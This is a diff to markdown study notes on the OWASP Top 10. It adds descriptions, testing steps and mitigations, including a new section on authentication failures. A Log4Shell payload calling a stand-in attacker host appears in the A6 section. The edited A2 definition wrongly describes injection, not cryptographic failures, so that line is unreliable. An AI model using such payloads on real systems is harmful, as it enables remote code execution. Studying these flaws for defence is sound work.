@@ -12,8 +12,9 @@
 
 
 ## A1 - Broken Access Control
-- **Core Concept** Failure to enforce proper restrictions on authenticated users actions.
+- **Core Concept** Application fails to properly enforce what authenticated users can do, allowing unauthorized access to data or functions, Failure to enforce proper restrictions on authenticated users actions.
 - Process:
+- Attackers change URLs, modify HTTP methods, tamper parameters or tokens to access admin-only or other users' resources.
     - Attackers manipulates parameters/URLs to access unauthorized resources.
     - Exploits missing role checks to perform privileged actions.
 
@@ -39,8 +40,9 @@
 
 
 ## A2 - Cryptographic Failures
-- **Core Concept** Exposure of Sensitive data due to weak encryption/handling.
+- **Core Concept** Unsanitized user input is interpreted as code/command by backend systems, Exposure of Sensitive data due to weak encryption/handling.
 - Process: 
+- Identify sensitive data (PII, credentials); check how it’s stored, transmitted, and whether strong encryption is applied.
     - Intercept unencrypted data (e.g., HTTP -> passwords).
     - Decrypt weakly protected data (e.g., AES-128 without proper IV).
 
@@ -68,6 +70,7 @@
 ## A3 - Injection
 - **Core Concept** Malicious data execution in interpreters (SQL, OS, etc.)
 - Process:
+- Identify input fields; inject payloads to manipulate SQL queries, OS commands, LDAP, etc.
     - Inject payloads input fields, Search boxs/APIs.
     - Trigger unintended execution (e.g., database deletion).
 
@@ -125,6 +128,7 @@
 - **Core Concept** Architectural flaws enabling business logic bypass.
 - Application is insecure by design – security was never included during architecture or requirements phase.
 - Process: 
+- Map system architecture; do threat modeling; identify missing controls (e.g., rate limiting).
     - Exploit flawed workflows (e.g., replaying payment requests).
     - Bypass multi-step processes (e.g., skipping OTP verification).
 
@@ -144,8 +148,9 @@
 Rate limiting (e.g., 5 login attempts/hour).
 
 ## A5 - Security Misconfiguration
-- **Core Concept** Unsecured defaults exposing systems.
+- **Core Concept** Wrong or default security settings, unnecessary features, or insecure cloud storage, Unsecured defaults exposing systems.
 - Process:
+- Scan servers and codebase; look for open ports, default creds, verbose errors.
     - Access admin interfaces at default paths (`/admin`)
     - Exploit verbose errors leaking stack traces.
 
@@ -169,8 +174,9 @@ Rate limiting (e.g., 5 login attempts/hour).
     - Configure your web server or application framework to set the `Access-Control-Allow/Origin, Headers` header with the specific allowed origins.
 
 ## A6 - Vulnerable and Outdated Components
-- **Core Concept** Known exploits in third-party libraries/services.
+- **Core Concept** Using libraries/frameworks/plugins with known vulnerabilities in third-party services.
 - Process:
+- Inventory dependencies; check versions; scan for known CVEs.
     - Identify versions via `package.json` /HTTP headers.
     - Exploit CVEs (e.g., Log4Shell: `${jndi:ldap//attacker}`)
 
@@ -190,16 +196,31 @@ Rate limiting (e.g., 5 login attempts/hour).
 - Maintain SBOM (Software Bill of Materials).
     - A Software Bill of Materials (SBOM) is a comprehensive list of all software components used in a product, including open-source and proprietary components, their versions, and licenses.
 
-## A7 - 
-- **Core Concept** 
+## A7 - Identification and Authentication Failures
+- **Core Concept** Weak login, password, or session management leads to account compromise, account security controls.
 - Process:
-    - 
+- Test login flow, session timeouts, token predictability.
+    - Brute-force weak passwords (`password123`).
+    - Hijack sessions via exposed cookies.
    
-
-#### Finding - 
-   - **How to find**: 
-
-#### Mitigations -  
+| Type | Description |
+|--------|--------------|
+| Credential Stuffing | Reusing breached passwords |
+| Session Fixation | Forcing session IDs on users |
+| Predictable reset tokens | Guessable tokens in session |
+| Missing MFA | No 2FA for sensitive actions |
+#### Finding - Identification and Authentication Failures
+- Test password policies (min length, complexity).
+- Check session expiration/timeouts.
+   - **How to find**: Manual testing, automated scanners, review token generation logic.
+#### Mitigations - Identification and Authentication Failures
+- Enforce MFA (TOTP, WebAuthn).
+    - TOTP (Time-Based One-Time Password): A mobile app generates a temporary, time-sensitive code that the user must enter during authentication.
+    - WebAuthn: A web standard that allows users to authenticate using strong cryptographic credentials (e.g., security keys, biometrics) instead of passwords.
+- USe secure cookies (`HttpOnly`, `Secure`).
+    - The `HttpOnly` flag prevents client-side scripts (e.g., JavaScript) from accessing the cookie. This mitigates the risk of XSS attacks, where an attacker could inject malicious scripts to steal session cookies.
+    -The `Secure` flag ensures that the cookie is only sent over secure HTTPS connections. This protects the cookie from being intercepted by attackers over unencrypted HTTP connections.
+- Implement account lockouts.
 
 ## A8 - 
 - **Core Concept** 
